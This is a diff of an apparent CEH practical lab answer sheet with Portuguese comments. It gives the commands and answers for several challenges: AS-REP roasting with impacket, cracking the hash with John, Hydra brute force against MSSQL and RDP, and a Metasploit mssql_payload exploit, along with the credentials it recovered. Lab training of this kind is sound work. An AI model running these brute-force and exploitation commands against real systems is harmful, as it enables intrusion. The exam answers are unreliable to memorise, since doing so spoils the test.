@@ -108,25 +108,40 @@ wireshark ~/Downloads/PyD_attack.pcapng
 #------------------------------#
 
 
-# ⚠️ PART II - Challenge 6  💬ANSWER: 192.168.10.222💬 
-#### C:\Users\Admin\Documents\report export.txt
-Get-Content '.\report export.txt' -TotalCount 20
-### INFO: Remote IP Address → 192.168.10.222
+# PART II - Challenge 6  💬ANSWER: 192.168.10.222💬 
+#### C:\Users\Admin\Documents\Anti-DDoS\report export.txt
+#### C:\Users\Admin\Documents\Anti-DDoS\rec001.txt
+#### C:\Users\Admin\Documents\Anti-DDoS\rec002.txt  
+cd 'C:\Users\Admin\Documents\Anti-DDoS\'
+notepad '.\rec001.txt' # CONFIRMAÇÃO DO VOLUME (COMPORTAMENTO)
+notepad '.\rec002.txt' # CONTEXTO DO ATAQUE (COMO FOI FEITO) # Mostra diversos cabeçalho, todos com Hosts: 192.168.10.144:135 (RPC)
+notepad '.\report export.txt' # VISÃO MACRO (QUEM MAIS ATACOU)
+### INFO: No. → 37, Outgoing bytes → 741444(Blocked), Incoming bytes → 13481074(Blocked)
+### INFO: Local IP Address → 192.168.10.144, Port → 135
+### INFO: Remote IP Address → 192.168.10.222, Port → 5486
+
+# Get-Content '.\report export.txt'
+# Get-Content '.\rec001.txt'
+# Get-Content '.\rec002.txt'
+# more '.\report export.txt'
+# more '.\rec001.txt'
+# more '.\rec002.txt'
+
 
 
 #------------------------------#
 
 
 # PART II - Challenge 7  💬ANSWER: c3ll0@123💬
-find / -type f -name '*.py' 2>/dev/null | grep GetNPU
-# nc -vz 192.168.10.222 88
-# nc -vz 192.168.10.222 445
-# nc -vz 192.168.10.222 135
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py SKILL.CEH/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222 -debug
+find ~ -type f -name '*.py' | grep GetNPUsers
+GetNPUsers.py SKILL.CEH/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
+nc -vz 192.168.0.222 88 # Verificar serviço Kerberos, porta 88, para ver se há AS-REP (resposta do Kerberos)
+nc -vz 192.168.0.222 445 # Verificar serviço SMB, porta 445, para ver se DC ativo
+nc -vz 192.168.0.222 135 # Verificar serviço RPC, porta 135, para ver se é infra Windows
 ### INFO: Hashe "Joshua@SKILL.CEH:cbd0830...." 
-nano a.txt # Salvar a hashe
-find ~ -type f -iname 'rockyou.txt' 2>/dev/null
-john --wordlist=/home/attacker/rockyou.txt a.txt
+nano hash_founded.txt # Salvar a hashe "cbd0830...."
+find ~ -type f -name 'rockyou.txt'
+john --wordlist=~/rockyou.txt hash_founded.txt
 ### INFO: c3ll0@123 (?)
 
 
@@ -134,33 +149,50 @@ john --wordlist=/home/attacker/rockyou.txt a.txt
 
 
 # PART II - Challenge 8  💬ANSWER: 7💬
-nmap -p 1433 192.168.10.0/24 --open
-hydra -L ~/Desktop/username.txt -P ~/Desktop/password.txt 192.168.10.144 mssql
+hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql -u -t 8 -w 5 
+# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql -u -V -t 8 
+# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.144 mssql
 ### INFO: [1433] [mssql] host: 192.168.10.144 login: Server_mssrv password: Spidy
 find / -type f -name 'mssqlclient.py' 2>/dev/null
-python3 /root/impacket/examples/mssqlclient.py SKILL.CEH/Server_mssrv:Spidy@192.168.10.144 -port 1433
-
-msfconsole -q -x "use exploit/windows/mssql/mssql_payload; set RHOST 192.168.10.144; set USERNAME Server_mssrv; set PASSWORD Spidy; set DATABASE msdb; exploit; exit"  # NOUTRO TERMINAL
-cd /Users/Public/Downloads # NO METERPRETER
+mssqlclient.py Server_mssrv:Spidy@192.168.10.144 -port 1433
+# mssqlclient.py SKILL.CEH/Server_mssrv:Spidy@192.168.10.144 -port 1433
+msfconsole -q -x "
+search mssql;
+use exploit/windows/mssql/mssql_payload;
+info;
+show options;
+set RHOST 192.168.10.144;
+set USERNAME Server_mssrv;
+set PASSWORD Spidy;
+set DATABASE msdb;
+show payloads;
+show targets;
+show advanced;
+exploit;"
+# cd C:\\Users\\Public\\Downloads\\
 dir 
-### INFO: Size → 7
+### INFO: Name → MSS.txt, Size → 7
 
 
 #------------------------------#
 
 
 # PART II - Challenge 9  💬ANSWER: Pumpkin@1234💬
-nmap -p 3389 192.168.10.0/24 --open
-hydra -l Maurice -P /home/attacker/rockyou.txt 192.168.10.222 rdp
+hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp -u -t 2 -w 5
+# hydra -L ~/users.txt -P ~/rockyou.txt 192.168.10.222 rdp -u -V -t 4 
+# hydra -l Maurice -P ~/rockyou.txt 192.168.10.222 rdp
+### INFO: [3389] [rdp] host: 192.168.10.222 login: Administrator password: Passw0rd@123
+### INFO: [3389] [rdp] host: 192.168.10.222 login: AdminDC password: @dmin@admin
 ### INFO: [3389] [rdp] host: 192.168.10.222 login: Maurice password: Pumpkin@1234
 
 
 #------------------------------#
 
 
-# ⚠️ PART II - Challenge 10  💬ANSWER: d282💬
-#### ~/Donwloads/Tools.rar
-sha256sum Tools.rar
+# PART II - Challenge 10  💬ANSWER: d282💬
+#### ~/Downloads/Tools.rar
+sha256sum ~/Downloads/Tools.rar | awk '{print substr($1,length($1)-3)}'
+sha256sum ~/Downloads/Tools.rar
 
 
 #------------------------------#
